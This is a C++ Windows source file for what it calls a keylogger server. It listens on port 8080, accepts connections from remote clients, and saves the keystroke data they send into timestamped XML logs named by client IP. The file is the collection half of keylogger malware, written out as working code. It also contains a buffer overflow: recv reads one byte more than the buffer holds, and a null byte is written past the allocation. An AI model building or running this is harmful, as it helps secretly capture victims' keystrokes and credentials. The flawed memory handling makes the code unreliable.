#include <winsock2.h>
#include <mswsock.h>
#include "ServerInterProcess.h"
#include <stdio.h>
#include <thread>
#include <mutex>
#include <fcntl.h>
#include <io.h>

HANDLE mu;
SOCKETLIST *head;
void Listener()
{
    WSADATA WSA;
    SOCKET Listener;
    SOCKADDR_IN server, target;
    head= reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
    (head->nextTarget)=0x00;
    (head->target)=0x00;
    SYSTEMTIME timestamp;

    int cL;
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return;
    }

    listen(Listener,3);
    cL=sizeof(target);
    while(true)
    {
        fprintf(stderr, "accepted\n\t\t[*]Listening: ");
        SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
        *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
        SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
        if(*acceptedTarget==INVALID_SOCKET)
        {
            fprintf(stderr ,"\n\t\t[*] error connecting");
        }
        else
        {

            fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
            u_long mode =1;
            WaitForSingleObject(mu,INFINITE);
            ioctlsocket(*acceptedTarget,FIONBIO,&mode);
            link->name = reinterpret_cast<char*>(malloc(0x100));
            link->target = acceptedTarget;
            /*
                if a file from the same ip is created at the same time then the naming convention
                may fail. try again for a new time_stamp.
            */
            do
            {
                GetSystemTime(&timestamp);
                sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                    timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                               FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                               FILE_ATTRIBUTE_NORMAL,NULL);
            }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
            SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
             WriteFile(link->FileDescriptor,
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);

            /*
                establish a self referential linked list,
                    A->B->C->A...
                each link contains a socket so the listener thread can read data off of the
                socket.
            */
            if((head->target)==0x00)
            {
                *head=*link;
                head->nextTarget=head;
            }
            else
            {
                link->nextTarget=head->nextTarget;
                head->nextTarget=link;
            }
            ReleaseMutex(mu);

        }

    }

}
void Handler()
{
        unsigned int rcv;
        char* buffer = reinterpret_cast<char *>(malloc(0x1000));
        SOCKETLIST *link;
        SOCKETLIST previousLink;
        while(1)
        {

            while(head==nullptr ||(head->target)== NULL )
                Sleep(1);
            WaitForSingleObject(mu,INFINITE);

                link=head;
            ReleaseMutex(mu);
            while((head->target)!=NULL)
            {

                while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                {
                        *(buffer+0x1000)=0x00;
                        WriteFile(link->FileDescriptor,buffer,strlen(buffer),NULL,NULL);
                        WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                  strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                        SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);

                }
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    Sleep(1);
                    WSASetLastError(0x00);
                    link = (link->nextTarget);
                }
                else
                {
                    SOCKETLIST temp = *(link->nextTarget);
                   if( link->target == temp.target)
                    {
                        WaitForSingleObject(mu,INFINITE);
                        head->target=0x00;
                        head->nextTarget=0x00;
                        ReleaseMutex(mu);
                    }
                    else
                    {
                      WaitForSingleObject(mu,INFINITE);
                      link->target = link->nextTarget->target;
                      link->nextTarget=link->nextTarget->nextTarget;
                      head = link;
                      ReleaseMutex(mu);
                    }

                }

            }
        }
}
/**
    this is a temporary server used for testing, future changes will be established
*/
int main()
{
    mu = CreateMutex(NULL,false,NULL);
    std::thread thread1 (Listener);
    std::thread thread2 (Handler);
    thread1.join();
    exit(-1);


    return 0;
}
